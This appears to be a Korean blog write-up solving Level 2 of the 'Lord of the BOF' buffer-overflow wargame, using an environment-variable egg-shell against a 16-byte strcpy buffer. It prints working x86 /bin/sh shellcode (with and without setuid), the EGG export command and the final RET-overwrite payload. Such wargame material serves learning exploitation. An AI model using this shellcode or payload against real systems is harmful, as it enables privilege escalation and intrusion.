---
layout: post
title: "The Lord of the BOF - Level 2"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level2/1.jpg" | relative_url }}' alt='relative'>  

## 1) gremlin/hello bof world 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level2/2.png" | relative_url }}' alt='relative'>  

level1번 문제와 비슷하지만 buffer 배열의 길이가 16 byte 입니다.  
배열에 쉘코드를 입력하는 방법은 적용할 수 없습니다.  
Eggshell 방식으로 문제를 해결하면 됩니다.  

<p id="stack">
## 2) cobolt 프로그램 스택 구조 확인하기  

<img data-action="zoom" src='{{ "assets/lob/level2/3.png" | relative_url }}' alt='relative'>  

``` bash
0x804845c <main+44>:    lea    %eax,[%ebp-16]
0x804845f <main+47>:    push   %eax
0x8048460 <main+48>:    call   0x8048370 <strcpy>
```

해당 부분을 보면 ebp 레지스터가 가리키고 있는 주소에서 16 byte 떨어진 위치에 buffer 배열이 위치하고 있습니다.  
RET 위치에 쉘코드가 저장된 환경변수 주소를 입력해주면 됩니다.  
buffer에 문자열을 입력할 때 길이 제한을 설정하지 않았기 때문에 RET 위치까지 공격자가 원하는 값을 입력할 수 있습니다.  

공격 페이로드는 20byte(=buffer(16byte)+SFP(4byte))의 NOP(\x90)과 환경변수 주소 4byte를 입력하여 총 24 byte가 됩니다.  

## 3) Eggshell 만들기  

``` bash
// Shellcode (setuid 포함, 39 byte)
\x31\xdb\x66\xbb\x1c\x0c\x89\xd9\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

// Shellcode (setuid 미포함, 25 byte)
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```

``` bash
export EGG=`python -c 'print "\x90"*20+"\x31\xdb\x66\xbb\x1c\x0c\x89\xd9\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

``` bash
echo 'int main() { printf("ADDR -> 0x%x\n", getenv("EGG")); }' > getenv.c
```

``` bash
gcc -o getenv getenv.c
```

``` bash
./getenv
```

<img data-action="zoom" src='{{ "assets/lob/level2/4.png" | relative_url }}' alt='relative'>  

## 4) 공격 페이로드 입력하여 BOF 일으키기  

``` bash
./cobolt `python -c 'print "\x90"*20+"\x90\xfe\xff\xbf"'`
```

<img data-action="zoom" src='{{ "assets/lob/level2/5.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level2/6.png" | relative_url }}' alt='relative'>  
